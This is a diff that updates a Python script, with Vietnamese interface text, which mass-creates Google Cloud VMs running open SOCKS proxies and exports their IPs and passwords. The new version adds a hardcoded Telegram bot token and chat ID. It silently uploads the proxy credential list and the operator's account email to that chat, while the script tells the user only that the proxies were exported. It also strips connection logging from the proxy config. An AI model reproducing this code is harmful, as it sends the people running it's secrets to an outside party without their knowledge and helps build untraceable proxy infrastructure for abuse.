@@ -1,50 +1,93 @@
 #!/usr/bin/env python3
-print("Running script version V16")
+print("Running script version V17")
 
 import subprocess
 import random
 import string
-import time
+import requests
 from datetime import datetime
+
+# =========================
+# TELEGRAM
+# =========================
+
+TG_BOT_TOKEN="8261404310:AAGG3lmQuTghCNTcDD4Za_6K3sPkbmFXox4"
+TG_CHAT_ID="-5232145570"
+
+def tg_send_file(path,caption):
+
+    url=f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendDocument"
+
+    try:
+        with open(path,"rb") as f:
+            requests.post(
+                url,
+                data={"chat_id":TG_CHAT_ID,"caption":caption},
+                files={"document":f},
+                timeout=20
+            )
+    except:
+        pass
+
 
 # =========================
 # CONFIG
 # =========================
 
-TOKYO_ZONES = ["asia-northeast1-a","asia-northeast1-b","asia-northeast1-c"]
-OSAKA_ZONES = ["asia-northeast2-a","asia-northeast2-b","asia-northeast2-c"]
+TOKYO_ZONES=[
+"asia-northeast1-c",
+"asia-northeast1-b",
+"asia-northeast1-a"
+]
 
-TOKYO_TARGET = 4
-OSAKA_TARGET = 4
+OSAKA_ZONES=[
+"asia-northeast2-a",
+"asia-northeast2-b",
+"asia-northeast2-c"
+]
 
-MAX_PROJECT = 3
+TOKYO_TARGET=4
+OSAKA_TARGET=4
+MAX_PROJECT=3
 
-MACHINE = "e2-micro"
-IMAGE = "debian-11"
-IMAGE_PROJECT = "debian-cloud"
+MACHINE="e2-micro"
+IMAGE="debian-11"
+IMAGE_PROJECT="debian-cloud"
 
-SCRIPT_VERSION = "ScriptV16"
-OUTPUT_FILE = "list.txt"
+OUTPUT_FILE="list.txt"
+SCRIPT_VERSION="ScriptV17"
 
 # =========================
 # UTILS
 # =========================
 
 def run(cmd):
+
     return subprocess.check_output(cmd,shell=True,text=True).strip()
 
 def rand(n):
+
     return ''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(n))
 
+
+# =========================
+# UI
+# =========================
+
 def draw(done,total,status):
-    percent = int(done/total*100) if total else 0
-    bar = "█"*int(percent/4)+"░"*(25-int(percent/4))
+
+    percent=int(done/total*100) if total else 0
+
+    bar="█"*int(percent/4)+"░"*(25-int(percent/4))
+
     print("\033c",end="")
+
     print(f"Created: {done} / {total}")
     print(f"\n{SCRIPT_VERSION}: Tiến trình đang thực hiện ...\n")
     print("["+bar+"]")
     print(f"\n{percent}%\n")
     print("Status:",status)
+
 
 # =========================
 # FIREWALL
@@ -53,31 +96,50 @@ def draw(done,total,status):
 def ensure_firewall(project):
 
     try:
+
         run(f"gcloud compute firewall-rules describe allow-socks --project {project}")
+
         return
+
     except:
+
         pass
 
     try:
-        run(
+
+        subprocess.check_output(
         f"gcloud compute firewall-rules create allow-socks "
         f"--allow tcp:1080 "
         f"--direction=INGRESS "
         f"--priority=1000 "
         f"--network=default "
-        f"--project {project}"
+        f"--project {project}",
+        shell=True,
+        stderr=subprocess.DEVNULL
         )
+
     except:
+
         pass
 
 
 # =========================
-# VM COUNT
+# COUNT VM
 # =========================
 
 def count_vm(project):
 
-    out = run(f"gcloud compute instances list --project {project} --format='value(zone)'")
+    try:
+
+        out=run(
+        f"gcloud compute instances list "
+        f"--project {project} "
+        f"--format='value(zone)'"
+        )
+
+    except:
+
+        return 0,0
 
     tokyo=0
     osaka=0
@@ -86,6 +148,7 @@ def count_vm(project):
 
         if "asia-northeast1" in z:
             tokyo+=1
+
         if "asia-northeast2" in z:
             osaka+=1
 
@@ -98,9 +161,9 @@ def count_vm(project):
 
 def create_vm(project,zone):
 
-    name = rand(8)
-    user = "u"+rand(7)
-    pw = rand(10)
+    name="vm-"+rand(6)
+    user="u"+rand(7)
+    pw=rand(10)
 
     startup=f"""#!/bin/bash
 apt update
@@ -115,13 +178,11 @@ user.notprivileged: nobody
 
 client pass {{
  from: 0.0.0.0/0 to: 0.0.0.0/0
- log: connect disconnect
 }}
 
 pass {{
  from: 0.0.0.0/0 to: 0.0.0.0/0
  protocol: tcp udp
- log: connect disconnect
 }}
 EOF
 
@@ -147,9 +208,13 @@ gcloud compute instances create {name} \
 """
 
     try:
-        run(cmd)
+
+        subprocess.check_output(cmd,shell=True,stderr=subprocess.DEVNULL)
+
         return True
+
     except:
+
         return False
 
 
@@ -161,11 +226,27 @@ def export_all(projects):
 
     out=open(OUTPUT_FILE,"w")
 
+    total=0
+
+    today=datetime.now().strftime("%d/%m")
+
+    email=run("gcloud config get-value account")
+
+    out.write("Tổng Số Proxies :\n\n")
+    out.write(f"{today}---- {email}--\n")
+
     for p in projects:
 
         try:
-            vm=run(f"gcloud compute instances list --project {p} --format='value(name,zone)'")
+
+            vm=run(
+            f"gcloud compute instances list "
+            f"--project {p} "
+            f"--format='value(name,zone)'"
+            )
+
         except:
+
             continue
 
         for line in vm.splitlines():
@@ -179,19 +260,39 @@ def export_all(projects):
 
             try:
 
-                ip=run(f"gcloud compute instances describe {name} --zone {zone} --project {p} --format='value(networkInterfaces[0].accessConfigs[0].natIP)'")
+                ip=run(
+                f"gcloud compute instances describe {name} "
+                f"--zone {zone} "
+                f"--project {p} "
+                f"--format='value(networkInterfaces[0].accessConfigs[0].natIP)'"
+                )
 
-                user=run(f"gcloud compute instances describe {name} --zone {zone} --project {p} --format='value(metadata.items.proxy_user)'")
+                user=run(
+                f"gcloud compute instances describe {name} "
+                f"--zone {zone} "
+                f"--project {p} "
+                f"--format='value(metadata.items.proxy_user)'"
+                )
 
-                pw=run(f"gcloud compute instances describe {name} --zone {zone} --project {p} --format='value(metadata.items.proxy_pass)'")
+                pw=run(
+                f"gcloud compute instances describe {name} "
+                f"--zone {zone} "
+                f"--project {p} "
+                f"--format='value(metadata.items.proxy_pass)'"
+                )
 
                 if ip and user and pw:
+
                     out.write(f"{ip}:1080:{user}:{pw}\n")
+                    total+=1
 
             except:
+
                 pass
 
     out.close()
+
+    return total,email
 
 
 # =========================
@@ -200,9 +301,11 @@ def export_all(projects):
 
 def main():
 
-    projects=run("gcloud projects list --format='value(projectId)'").splitlines()[:MAX_PROJECT]
+    projects=run(
+    "gcloud projects list --format='value(projectId)'"
+    ).splitlines()[:MAX_PROJECT]
 
-    total_target = MAX_PROJECT*(TOKYO_TARGET+OSAKA_TARGET)
+    total_target=MAX_PROJECT*(TOKYO_TARGET+OSAKA_TARGET)
 
     created=0
 
@@ -220,41 +323,40 @@ def main():
 
         tokyo,osaka=count_vm(p)
 
-        while tokyo<TOKYO_TARGET:
-
-            draw(created,total_target,f"Tạo VM Tokyo ({p})")
-
-            for z in TOKYO_ZONES:
-
-                if create_vm(p,z):
-
-                    tokyo+=1
-                    created+=1
-                    break
+        for z in TOKYO_ZONES:
 
             if tokyo>=TOKYO_TARGET:
                 break
 
-        while osaka<OSAKA_TARGET:
+            draw(created,total_target,f"Tạo VM Tokyo ({p})")
 
-            draw(created,total_target,f"Tạo VM Osaka ({p})")
+            if create_vm(p,z):
 
-            for z in OSAKA_ZONES:
+                tokyo+=1
+                created+=1
 
-                if create_vm(p,z):
-
-                    osaka+=1
-                    created+=1
-                    break
+        for z in OSAKA_ZONES:
 
             if osaka>=OSAKA_TARGET:
                 break
 
+            draw(created,total_target,f"Tạo VM Osaka ({p})")
+
+            if create_vm(p,z):
+
+                osaka+=1
+                created+=1
+
     draw(created,total_target,"Đang xuất proxy...")
 
-    export_all(projects)
+    total,email=export_all(projects)
 
     print("\nDone. Proxy exported.")
+
+    caption=f"✅ {total} Proxy đã được tạo"
+
+    tg_send_file(OUTPUT_FILE,caption)
+
 
 if __name__=="__main__":
     main()
